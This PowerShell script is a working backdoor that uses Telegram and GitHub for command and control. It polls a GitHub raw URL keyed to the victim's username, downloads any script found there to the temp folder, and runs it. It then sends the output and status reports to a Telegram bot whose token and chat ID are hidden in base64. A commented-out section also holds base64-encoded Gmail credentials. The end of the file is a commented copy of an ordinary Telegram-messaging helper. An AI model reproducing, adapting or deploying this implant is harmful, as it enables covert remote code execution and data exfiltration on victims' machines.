function Send-ToEmail([string]$email,[string]$body,[string]$subj=[Environment]::MachineName){
    # $UsernameEnc = "eABhAGsAZQByAC4AaQBzAGkAMAAwADcAQABnAG0AYQBpAGwALgBjAG8AbQA=";
    # $PasswordEnc = "cAB2AGsAcgBmAHIAeABpAHAAeABqAHIAdgBlAHcAZgA=";
    # $Username = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($UsernameEnc))
    # $Password = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($PasswordEnc))
    # $message = new-object Net.Mail.MailMessage;
    # $message.From = $Username;
    # $message.To.Add($email);
    # $message.Subject = $subj;
    # $message.Body = $body;
    # $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
    # $smtp.EnableSSL = $true;
    # $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
    # $smtp.send($message);
    $id = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("MgAwADQANwAyADQAOAA0ADgANwA="))
    $body_json = @{
    "chat_id"= $id
    "text"= "`r<b>$subj</b>`n<code>$body</code>"
    "disable_notification"= "true"
    "parse_mode" = "HTML"
    } | ConvertTo-Json -Depth 4
    $tok = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("NQA0ADUAMwA3ADYANgA4ADEAOQA6AEEAQQBFAFYARgB2AGgAUwBlAEEAMQBZAHMAWABlAHoARgBVAHkAcgBiAGgAVQAyADkAbABlAGoAcwBBADEALQBfAE0AYwA="))
    Invoke-RestMethod -Method 'Post' -Uri "https://api.telegram.org/bot$tok/sendMessage" -Body $body_json -ContentType "application/json"


 }
 
 function Get-UrlStatusCode([string] $Url)
{
    try
    {
        (Invoke-WebRequest -Uri $Url -UseBasicParsing -DisableKeepAlive).StatusCode
    }
    catch [Net.WebException]
    {
        [int]$_.Exception.Response.StatusCode
    }
}
$name = $env:username
$url = "https://raw.githubusercontent.com/4V4loon/tools/master/ctwo/$name"
$receiver=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("eABlAGwAaQBsAC4AaQBzAGkAMAAwADcAQABnAG0AYQBpAGwALgBjAG8AbQA="))
$statusCode = Get-UrlStatusCode $url
if ($statusCode -eq 200){
    $contentLocal = "False"
    $contentWeb = Invoke-WebRequest -Uri $url -UseBasicParsing | select -ExpandProperty Content
    $diff = Compare-Object -ReferenceObject $($contentLocal) -DifferenceObject $($contentWeb)
    if(($contentWeb -eq "Online") -or ($contentWeb -eq "Online`n")){
        Send-ToEmail -email $receiver -body $name -subj "Online"
        exit
    }
    elseif($diff) {
        $file="$env:tmp\cd.ps1"
        try {
            Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $file
            # start powershell {powershell -file $file} -RedirectStandardOutput lg.txt -RedirectStandardError er.txt
            $runn = powershell -file $file 2>&1 | Out-String
            if($?){
                # $runn = Get-Content -Path .\lg.txt
                # remove-item -force -path .\lg.txt
                $res=$contentWeb + [Environment]::NewLine + $runn
                $don = "Done - "+$name; Send-ToEmail -email $receiver -body $res -subj $don

            }
        } catch {
            $err = $_ | Out-String
            # $err = Get-Content -Path .\er.txt
            # remove-item -force -path .\er.txt
            $suberr = "Error - "+$name
            Send-ToEmail -email $receiver -body $err -subj $suberr
        }
        finally {
            Remove-Item -Path $file -Force
        }
    } 

} else {
    Send-ToEmail -email $receiver -body $name -subj "UserNotFound"
}
# $runn = & Invoke-Expression $contentWeb 2>&1 | Out-String
# Invoke-Expression $contentWeb -ErrorAction Stop







# Send-TelegramTextMessage -BotToken $bot -ChatID $chat -Message "`r*Title*`n``HELLO How Are You``"





# <#
# Synopsis
#    Sends Telegram text message via Bot API
# DESCRIPTION
#    Uses Telegram Bot API to send text message to specified Telegram chat. Several options can be specified to adjust message parameters.
# EXAMPLE
#     $bot = "#########:xxxxxxx-xxxxxxxxxxxxxxxxxxxxxxxxxxx"
#     $chat = "-#########"
#     Send-TelegramTextMessage -BotToken $bot -ChatID $chat -Message "Hello"
# #EXAMPLE
#     $bot = "#########:xxxxxxx-xxxxxxxxxxxxxxxxxxxxxxxxxxx"
#     $chat = "-#########"

#     Send-TelegramTextMessage `
#         -BotToken $bot `
#         -ChatID $chat `
#         -Message "Hello *chat* _channel_, check out this link: [TechThoughts](http://techthoughts.info/)" `
#         -ParseMode Markdown `
#         -Preview $false `
#         -Notification $false `
#         -Verbose
# PARAMETER BotToken
#    Use this token to access the HTTP API
# PARAMETER ChatID
#    Unique identifier for the target chat
# PARAMETER Message
#    Text of the message to be sent
# PARAMETER ParseMode
#    Send Markdown or HTML, if you want Telegram apps to show bold, italic, fixed-width text or inline URLs in your bot's message. Default is Markdown.
# PARAMETER Preview
#    Disables link previews for links in this message. Default is $false
# PARAMETER Notification
#    Sends the message silently. Users will receive a notification with no sound. Default is $false
# OUTPUTS
#    System.Boolean
# NOTES
#     Author: Jake Morrison - @jakemorrison - http://techthoughts.info/
#     This works with PowerShell Versions 5.1, 6.0, 6.1
#     For a description of the Bot API, see this page: https://core.telegram.org/bots/api
#     How do I get my channel ID? Use the getidsbot https://telegram.me/getidsbot
#     How do I set up a bot and get a token? Use the BotFather https://t.me/BotFather
# COMPONENT
#   PoshGram - https://github.com/techthoughts2/PoshGram
# FUNCTIONALITY
#     https://core.telegram.org/bots/api#sendmessage
#     Parameters                  Type                Required    Description
#     chat_id                     Integer or String   Yes         Unique identifier for the target chat or username of the target channel (in the format @channelusername)
#     text                        String              Yes         Text of the message to be sent
#     parse_mode                  String              Optional    Send Markdown or HTML, if you want Telegram apps to show bold, italic, fixed-width text or inline URLs in your bot's message.
#     disable_web_page_preview    Boolean             Optional    Disables link previews for links in this message
#     disable_notification        Boolean             Optional    Sends the message silently. Users will receive a notification with no sound.
#     reply_to_message_id         Integer             Optional    If the message is a reply, ID of the original message
# #>
# function Send-TelegramTextMessage2 {
#     [CmdletBinding()]
#     Param
#     (
#         [Parameter(Mandatory = $true,
#             HelpMessage = '#########:xxxxxxx-xxxxxxxxxxxxxxxxxxxxxxxxxxx')]
#         [ValidateNotNull()]
#         [ValidateNotNullOrEmpty()]
#         [string]$BotToken, #you could set a token right here if you wanted
#         [Parameter(Mandatory = $true,
#             HelpMessage = '-#########')]
#         [ValidateNotNull()]
#         [ValidateNotNullOrEmpty()]
#         [string]$ChatID, #you could set a Chat ID right here if you wanted
#         [Parameter(Mandatory = $true,
#             HelpMessage = 'Text of the message to be sent')]
#         [ValidateNotNull()]
#         [ValidateNotNullOrEmpty()]
#         [string]$Message,
#         [Parameter(Mandatory = $false,
#             HelpMessage = 'HTML vs Markdown for message formatting')]
#         [ValidateSet("Markdown", "HTML")]
#         [string]$ParseMode = "Markdown", #set to Markdown by default
#         [Parameter(Mandatory = $false,
#             HelpMessage = 'Disables link previews')]
#         [bool]$Preview = $false, #set to false by default
#         [Parameter(Mandatory = $false,
#             HelpMessage = 'Sends the message silently')]
#         [bool]$Notification = $false #set to false by default
#     )
#     #------------------------------------------------------------------------
#     $results = $true #assume the best
#     #------------------------------------------------------------------------
#     $payload = @{
#         "chat_id"                   = $ChatID;
#         "text"                      = $Message
#         "parse_mode"                = $ParseMode;
#         "disable_web_page_preview"  = $Preview;
#         "disable_notification"      = $Notification
#     }#payload
#     #------------------------------------------------------------------------
#     try {
#         Write-Verbose -Message "Sending message..."
#         $eval = Invoke-RestMethod `
#             -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
#             -Method Post `
#             -ContentType "application/json" `
#             -Body (ConvertTo-Json -Compress -InputObject $payload) `
#             -ErrorAction Stop
#         if (!($eval.ok -eq "True")) {
#             Write-Warning -Message "Message did not send successfully"
#             $results = $false
#         }#if_StatusDescription
#     }#try_messageSend
#     catch {
#         Write-Warning "An error was encountered sending the Telegram message:"
#         Write-Error $_
#         $results = $false
#     }#catch_messageSend
#     return $results
#     #------------------------------------------------------------------------
# }
